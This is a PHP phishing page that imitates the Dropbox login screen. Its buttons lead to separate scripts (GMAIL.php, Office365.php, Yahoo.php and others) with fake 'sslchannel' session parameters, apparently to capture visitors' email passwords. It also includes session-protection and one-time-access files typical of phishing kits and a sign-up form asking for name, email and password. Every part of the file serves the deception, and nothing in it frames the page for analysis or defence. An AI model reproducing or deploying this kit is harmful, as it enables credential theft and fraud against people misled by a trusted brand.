<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
ini_set('display_errors', 0);
?>
<!DOCTYPE html>
<html xmlns:fb="http://ogp.me/ns/fb#" xml:lang="en" class="media-desktop" xmlns="http://www.w3.org/1999/xhtml" lang="en">
   <head>
      <script type="text/javascript" async="" src="assets/recaptcha__en.js" nonce="rDSYMsjFdbZdou0yc0bB"></script><script nonce="rDSYMsjFdbZdou0yc0bB">
         window._goch_ = {};
         window.addEventListener('click', function(event) {
             'use strict';
             for (var elm = event.target; elm; elm = elm.parentElement) {
                 if (elm.id &&
                     window._goch_.hasOwnProperty(elm.id) &&
                     window._goch_[elm.id].call(elm, event) === false) {
                     event.preventDefault();
                 }
             }
         }, true);
         window._csp_external_script_nonce = "t+LHgDDShAL7kkhyrf8y"
      </script>
      <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
      <meta content="origin-when-cross-origin" name="referrer">
      
      <link href="assets/favicon-vflUeLeeY.ico" rel="shortcut icon">
      <link href="assets/main-vfle6GE8x.css" type="text/css" rel="stylesheet">
      <script type="text/javascript" nonce="rDSYMsjFdbZdou0yc0bB">window.ST=+new Date();</script>
      <link href="assets/dropbox_webclip_60_m1.png" rel="apple-touch-icon">
      <link href="assets/dropbox_webclip_76_m1.png" rel="apple-touch-icon" sizes="76x76">
      <link href="assets/dropbox_webclip_120_m1.png" rel="apple-touch-icon" sizes="120x120">
      <link href="assets/dropbox_webclip_152_m1.png" rel="apple-touch-icon" sizes="152x152">
      <meta content="text/html; charset=UTF-8" http-equiv="content-type">
      <meta content="Login to Dropbox. Bring your photos, docs, and videos anywhere and keep your files safe." name="description">

      <meta content="Login - Dropbox " name="twitter:title">
      <meta content="Login to Dropbox. Bring your photos, docs, and videos anywhere and keep your files safe." name="twitter:description">
      <meta content="TnuSyOnBMNmtugbpL1ZvW2PbSF9LKvoTzrvOGS9h-b0" name="google-site-verification">
      <meta content="EZKIczQcM1-DVUMz8heu1dIhNtxNbLqbaA9-HbOnCQ4" name="google-site-verification">
      <meta content="tz8iotmk-pkhui406y41y5bfmfxdwmaa4a-yc0hm6r0fga7s6j0j27qmgqkmc7oovihzghbzhbdjk-uiyrz438nxsjdbj3fggwgl8oq2nf4ko8gi7j4z7t78kegbidl4" name="norton-safeweb-site-verification">
      <meta content="#ffffff" name="msapplication-TileColor">
      <title>Login - Dropbox </title>
      <style type="text/css">.hny-tzjzm { display: none; }</style>
      <link href="assets/button-vflTJq0ov.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/exp_cards-vflJsYU3g.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/login_form-vflmSMDvC.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/login_or_register-vflAJk0Kd.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/react_locale_selector-vflC9sKcN.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/layout-vflvc3veE.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/index-vflf_Uzj-.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/base-vflY2FNU1.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/font_atlas_grotesk-vflmCGKGO.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/font_sharp_grotesk-vfle4tE4q.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/typography-vfl1B2M2Y.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/components-vflbDMbD3.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/login_or_register-vfl9esD0O.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/recaptcha-vflIN6j39.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/recaptcha_challenge-vflrcf67y.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/recaptcha_v2_challenge-vfl5GXpO2.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/scooter-scoped-vflWuydQl.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/index.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/web_sprites-vflv2MHAO.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
      <link href="assets/css.css" type="text/css" rel="stylesheet">
   <script type="text/javascript" charset="utf-8" async="" src="assets/pkg-react-15.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/jquery_bundle.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-controllers-core.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-login-pages-externals.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-login-and-register-pages.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/hi_res.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-exception-reporting.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-api_v2.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-external.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-core.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-profile_services.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-timing.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-sharing-sync-and-share-page.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-coreui.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-captcha.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-i18n.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-login-pages.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/tabbable.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/form.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/api_002.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/trust_checkbox.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/phone_form.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-modules-unneeded-for-home.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/seckey_form.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/google_login_button.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/types_003.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/authenticator_form.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/types_002.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/utils.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/error.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/sso_utils.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/email_form.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/login_error.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/checkbox.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/credentials_form.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-legacy-af.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/text.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/recaptcha.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/form_002.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-purchase-form.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/types.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/view.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/name_fields.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/google_register_button.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-coreui-with-i18n.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-legacy-ab.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-lasso-footer.js"></script><script type="text/javascript" charset="utf-8" async="" src="assets/pkg-sharing-core.js"></script>
      <link href="assets/password_strength_meter-vflAqZDga.css" rel="stylesheet" type="text/css">
      <link href="assets/bubble_dropdown_v2-vflzxzIjM.css" rel="stylesheet" type="text/css">
      <script type="text/javascript" charset="utf-8" async="" src="assets/zxcvbn.js"></script>
   </head>
   <body class="en" dir="ltr" cz-shortcut-listen="true">
      <div>
         <div data-reactroot="" class="funcaptcha-modal--hidden-firefox funcaptcha-modal">
            <div class="funcaptcha-div"><iframe sandbox="allow-scripts allow-same-origin allow-forms" class="funcaptcha-frame" src="assets/a.htm" width="100%" height="100%" frameborder="0"></iframe></div>
         </div>
      </div>
      <div style="display: none;" id="modal-behind" class="uxa-modal"></div>
      <div style="display: none;" id="modal">
         <div id="modal-box">
            <a aria-label="Close" href="#" id="modal-x"></a>
            <h2 id="modal-title"></h2>
            <div id="modal-content"></div>
         </div>
      </div>
      <div style="display: none;" id="modal-overlay"></div>
      <div style="display:none" id="grave-yard"></div>
      <div style="display:none" id="trash-can"></div>
      <script type="text/template" id="tutorial_nav_bubble_tmpl" nonce="rDSYMsjFdbZdou0yc0bB"><div class="tutorial-bubble-content"><a class="tutorial-bubble-x-link"><img src="/static/images/x-small-active.png" class="tutorial-bubble-x-img" /></a><h1 class="tutorial-bubble-title"><%= TEMPLATE_DATA.title %></h1><p class="tutorial-bubble-body"><%= TEMPLATE_DATA.body %></p><a class="tutorial-bubble-button <%= TEMPLATE_DATA.button_class %>"><%= TEMPLATE_DATA.button_text %></a></div></script>
      <div id="floaters"></div>
      <div style="display: none;" class="external-drop-indicator top"></div>
      <div style="display: none;" class="external-drop-indicator right"></div>
      <div style="display: none;" class="external-drop-indicator bottom"></div>
      <div style="display: none;" class="external-drop-indicator left"></div>
      <span class="dropbox-2015 dropbox-logo-2015">
         <header class="mast-head">
            <div class="mast-head__container container">
               <nav class="mast-head__nav mast-head-nav">
                  <ul class="nav-list">
                     <li class="nav-list__item nav-list__item--dfb"><a href="#" id="try-dfb" class="button-tertiary try-dfb">Try Dropbox Business</a></li>
                  </ul>
                  <ul class="nav-list">
                     <li class="nav-list__item nav-list__item--download"><a href="#" class="button-link">Download the app</a></li>
                  </ul>
               </nav>
               <h1 id="dropbox-logo" class="dropbox-logo"><a href="#" class="dropbox-logo__link"><img src="assets/dropbox_logo_glyph_2015_m1.svg" alt="" class="dropbox-logo__glyph"><img src="assets/dropbox_logo_text_2015_m1.svg" alt="" class="dropbox-logo__type">Dropbox</a></h1>
            </div>
         </header>
      </span>
      <div id="outer-frame">
         <div id="page-content">
            <div tabindex="-1" id="main-skip" class="main-skip-destination"></div>
            <div id="login-or-register-page-content">
               <img data-js-component-id="component6290308036371508718" src="assets/sign-in-boulder2x-vfl87XcA-.png" data-hi-res="assets/sign-in-boulder@2x-vfl87XcA-.png" alt="" class="login-or-register-img" style="width: 350px; height: 377px;">
               <div class="login-register-container-wrapper">
                  <div class="login-register-container standard login-register-container--link-top" id="pyxl6290308036371508719">
                     <div class="login-register-login-part">
                        <div class="clearfix">
                           <div class="login-register-header">Sign in with your e-mail</div>
                         
                        </div>
                        <div id="component6290308036371508721">
                           <div class="login-form-container standard login-form-container standard" data-reactroot="" data-reactid="1">
                              <div class="regular-login-forms" data-reactid="2">
                                 <div class="login-form-container--subcontainer" data-reactid="3">
                                    <div class="login-form-container__google-div" data-reactid="4">
                                       <a href="GMAIL.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="auth-google button-primary" type="button" data-reactid="5">
                                          <div class="sign-in-text" data-reactid="6">Sign in with Google Mail</div>
                                       </a>
                                    </div>
									<div class="login-form-container__google-div" data-reactid="4">
                                       <a href="Office365.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="auth-google button-primary" type="button" data-reactid="5" style="background-image: url('assets/office.png');">
                                          <div class="sign-in-text" data-reactid="6">Sign in with Office365</div>
                                       </a>
                                    </div>
									<div class="login-form-container__google-div" data-reactid="4" >
                                       <a href="Hotmail.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="auth-google button-primary" type="button" data-reactid="5" style="background-image: url('assets/hotmail.png');">
                                          <div class="sign-in-text" data-reactid="6">Sign in with Hotmail</div>
                                       </a>
                                    </div>
									<div class="login-form-container__google-div" data-reactid="4">
                                       <a href="Yahoo.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="auth-google button-primary" type="button" data-reactid="5" style="background-image: url('assets/yahoo.png');">
                                          <div class="sign-in-text" data-reactid="6">Sign in with Yahoo Mail</div>
                                       </a>
                                    </div>
									<div class="login-form-container__google-div" data-reactid="4">
                                       <a href="Aol.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="auth-google button-primary" type="button" data-reactid="5" style="background-image: url('assets/aol.png');">
                                          <div class="sign-in-text" data-reactid="6">Sign in with AOL Mail</div>
                                       </a>
                                    </div>
									<div class="login-form-container__google-div" data-reactid="4">
                                       <a href="Other.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="auth-google button-primary" type="button" data-reactid="5" style="background-image: url('assets/other.png');">
                                          <div class="sign-in-text" data-reactid="6">Sign in with other mail</div>
                                       </a>
                                    </div>
									
                                </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="login-register-register-part">
                        <div class="clearfix">
                           <div class="login-register-header">Create an account</div>
                           <div class="login-register-switch">or <a href="#" class="login-register-switch-link">log in</a></div>
                        </div>
                        <div id="component6290308036371508723" class="form_shown register third_party_auth">
                           <div data-reactroot="" class="form_shown login-form-container register standard">
                              <form class="clearfix credentials-form register-form" method="post">
                                 <div class="credentials-form__fields">
                                    <div class="register-form__name-fields">
                                       <div class="text-input standard input-fname first text-input__margin-right">
                                          <div class="text-input-error-wrapper"></div>
                                          <div class="text-input-wrapper"><input type="text" id="fname5422489455577878" class="text-input-input" name="fname" autocomplete="off"><label for="fname5422489455577878">First name</label></div>
                                       </div>
                                       <div class="text-input standard input-lname second">
                                          <div class="text-input-error-wrapper"></div>
                                          <div class="text-input-wrapper"><input type="text" id="lname32390043104259536" class="text-input-input" name="lname" autocomplete="off"><label for="lname32390043104259536">Last name</label></div>
                                       </div>
                                    </div>
                                    <div class="register-form__credential-fields">
                                       <div class="text-input standard input-email text-input__margin-right">
                                          <div class="text-input-error-wrapper"></div>
                                          <div class="text-input-wrapper"><input type="email" id="email624407654375392" class="text-input-input" name="email" autocomplete="off"><label for="email624407654375392">Email</label></div>
                                       </div>
                                       <div class="text-input standard input-password">
                                          <div class="text-input-error-wrapper"></div>
                                          <div class="text-input-wrapper">
                                             <div class="password-input-meter standard" tabindex="-1" aria-label="Password strength">
                                                <div class="password-input-dot"></div>
                                                <div class="password-input-dot"></div>
                                                <div class="password-input-dot"></div>
                                                <div class="password-input-dot"></div>
                                                <div class="bubble-dropdown-v2-container"><button class="password-bubble__button" aria-expanded="false" id="bubbleDropdownTarget-1"></button></div>
                                             </div>
                                             <input type="password" id="password05289862588064742" class="text-input-input password-input" name="password" value="" autocomplete="off"><label for="password05289862588064742">Password</label>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="recaptcha-v2-challenge-container recaptcha-v2-challenge-container--invisible" style="display: block;">
                                    <div class="recaptcha-terms-text">
                                       <!-- react-text: 29 -->This page is protected by reCAPTCHA, and subject to the Google <!-- /react-text -->
                                       <a href="#" target="_blank" rel="noopener noreferrer">
                                          <!-- react-text: 31 -->Privacy Policy<!-- /react-text -->
                                       </a>
                                       <!-- react-text: 32 --> and <!-- /react-text -->
                                       <a href="#" target="_blank" rel="noopener noreferrer">
                                          <!-- react-text: 34 -->Terms of service<!-- /react-text -->
                                       </a>
                                       <!-- react-text: 35 -->.<!-- /react-text -->
                                    </div>
                                    <div class="recaptcha_v2_challenge"></div>
                                    <div class="recaptcha_v2_challenge" style="">
                                       <div class="grecaptcha-badge" data-style="none" style="width: 256px; height: 60px; display: none;">
                                          <div class="grecaptcha-logo"><iframe src="assets/anchor_002.htm" role="presentation" name="a-5n3vhu7cdwru" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="256" height="60" frameborder="0"></iframe></div>
                                          <div class="grecaptcha-error"></div>
                                          <textarea id="g-recaptcha-response-1" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="checkbox standard agree checkbox-inline">
                                    <div class="text-input-error-wrapper"></div>
                                    <input type="checkbox" id="tos_agree22560613766481175" name="tos_agree" aria-checked="false" value="on"><label for="tos_agree22560613766481175" class="checkbox_label"><span>I agree to <a href="#">Dropbox terms</a>.</span></label>
                                 </div>
                                 <button class="login-button button-primary" type="submit"><span>Create an account</span></button>
                                 <div class="hr-label"><span class="hr-label__text">or</span></div>
                                 <button class="auth-google button-primary button-undefined" type="button"><span class="sign-up-text">Sign up with Google</span></button>
                              </form>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div id="page-prefooter"></div>
         <footer>
            <div id="page-full-footer">
               <div id="footer-top-margin"></div>
               <div id="footer-border"></div>
               <div class="footer-col">
                  <ul>
                     <li class="header">Dropbox</li>
                     <li><a href="#">Install</a></li>
                     <li><a href="#">Mobile</a></li>
                     <li><a href="#">Pricing</a></li>
                     <li><a href="#">Business</a></li>
                     <li><a href="#">Enterprise</a></li>
                     <li><a href="#">Features</a></li>
                  </ul>
               </div>
               <div class="footer-col">
                  <ul>
                     <li class="header">About us</li>
                     <li><a href="#">Dropbox Blog</a></li>
                     <li><a href="#">About</a></li>
                     <li><a href="#">Branding</a></li>
                     <li><a href="#">News</a></li>
                     <li><a href="#">Jobs</a></li>
                  </ul>
               </div>
               <div class="footer-col">
                  <ul>
                     <li class="header">Support</li>
                     <li><a href="#">Help Center</a></li>
                     <li><a href="#">Contact us</a></li>
                     <li><a href="#">Copyright</a></li>
                     <li><a href="#">Cookies</a></li>
                     <li><a href="#">Privacy &amp; Terms</a></li>
                  </ul>
               </div>
               <div class="footer-col">
                  <ul>
                     <li class="header">Community</li>
                     <li><a href="#">Referrals</a></li>
                     <li><a href="#">Forum</a></li>
                     <li><a href="#" target="_blank" rel="noreferrer">Twitter</a></li>
                     <li><a href="#" target="_blank" rel="noreferrer">Facebook</a></li>
                     <li><a href="#">Developers</a></li>
                  </ul>
               </div>
               <div class="react-locale-selector-wrapper">
                  <div id="component6290308036371508724">
                     <div data-reactroot="" id="locale-container"><span id="locale-link"><img class="sprite sprite_web s_web_globe_gray_20x20" src="assets/icon_spacer-vflN3BYt2.gif" alt=""><button class="button-as-link react-locale-selector-link" title="Choose a language"><span data-locale="en">English (United States)</span><img class="sprite sprite_web s_web_arrow-up-gray" src="assets/icon_spacer-vflN3BYt2.gif" alt=""></button></span></div>
                  </div>
               </div>
               <div class="clear"></div>
            </div>
         </footer>
         <noscript>
            <p class="center">The Dropbox website requires JavaScript.</p>
         </noscript>
      </div>
      <div style="position: absolute; top: 0; left: 0; font-family: Courier" id="ieconsole"></div>
      <div style="position:absolute; top:-10000px;width:0px; height:0px; left: 0;" id="FB_HiddenContainer"></div>
    <img src="assets/hstsping" alt="" style="display:none;">
      <div id="accessible-announce" class="ax-visually-hidden" aria-live="assertive"></div>
      <iframe style="display: none;" src="assets/login.htm" sandbox="allow-scripts allow-same-origin" hidden=""></iframe><script src="assets/api.js" nonce="rDSYMsjFdbZdou0yc0bB"></script>
   </body>
</html>
